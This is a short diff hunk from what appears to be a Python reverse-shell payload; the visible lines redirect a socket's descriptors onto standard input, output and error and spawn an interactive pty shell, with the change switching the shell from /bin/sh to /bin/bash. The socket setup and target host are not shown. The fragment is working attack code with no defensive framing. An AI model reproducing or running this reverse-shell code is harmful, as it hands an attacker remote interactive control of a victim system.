@@ -12,6 +12,6 @@ os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 
-pty.spawn('/bin/sh')
+pty.spawn('/bin/bash')
 s.close()
 "
